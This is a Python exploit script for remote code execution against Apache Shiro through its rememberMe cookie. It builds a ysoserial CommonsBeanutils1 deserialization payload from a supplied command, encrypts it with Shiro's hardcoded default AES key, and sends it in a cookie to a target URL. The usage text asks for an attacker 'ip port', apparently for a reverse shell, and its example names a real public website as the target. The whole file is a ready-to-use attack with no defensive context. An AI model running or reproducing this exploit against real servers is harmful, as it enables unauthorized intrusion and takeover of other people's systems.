# -*- coding: utf-8 -*-
import requests
import os
import sys
import uuid
import base64
import subprocess
import argparse
from Crypto.Cipher import AES

#get a rememberme payload
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-shuyu.jar', 'CommonsBeanutils1', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def exp_shiro(url,cmd):
    payload = encode_rememberme(cmd)
    headers={
        #"Host": "192.168.99.100:8081",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cookie": "JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}".format(payload.decode()),
        "Upgrade-Insecure-Requests": "1"
    }
    #print("JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}".format(payload.decode()))
    requests.get(url,headers=headers)

if __name__=='__main__':
    if len(sys.argv)!=3:
        print("Usage:"+"python3 shiro_rce.py  url  \"ip port\"")
        print("Example:"+"python3 shiro_rce.py http://www.baidu.com/login.do \"xxx.xxx.xx.xx 7777\"")
    else:
        try:
            url = sys.argv[1]
            command = sys.argv[2]
            exp_shiro(url,command)
        except Exception as e:
            print(e)